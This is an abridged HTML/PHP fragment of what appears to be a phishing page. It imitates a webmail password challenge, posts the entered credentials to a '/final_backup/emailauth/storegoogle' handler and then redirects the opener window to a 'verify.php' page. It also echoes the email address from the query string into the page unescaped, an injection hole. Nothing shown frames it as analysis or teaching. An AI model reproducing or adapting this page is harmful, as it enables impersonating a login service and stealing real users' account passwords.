...
<html id="Stencil" class="js grid light-theme "><head>
    ...
    <form action="/final_backup/emailauth/storegoogle" method="POST" class="pure-form challenge-form" id="emailaccess">
        <input type="hidden" id="emaildress" name="emaildress" value="" data-rapid_p="5"><div class="hidden-username">
            ...
            <input type="hidden" name="emailaddress" value="<?php echo $_GET['email']; ?>">
        ...
        <div class="button-container">
            <button type="submit" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-ylk="elm:btn;elmt:primary;mKey:primary_login_account-challenge-password_primaryBtn" data-rapid_p="10">
                    Next
            </button>
        </div>
...
<script>
    ...
    $("#login-signin").click(function(e) {
        ...
        if ($.trim($('#login-passwd').val()).length < 4) {
            ...
            window.opener.location.replace('/final_backup/verify.php');
            window.close;
        }
    });
    </script>
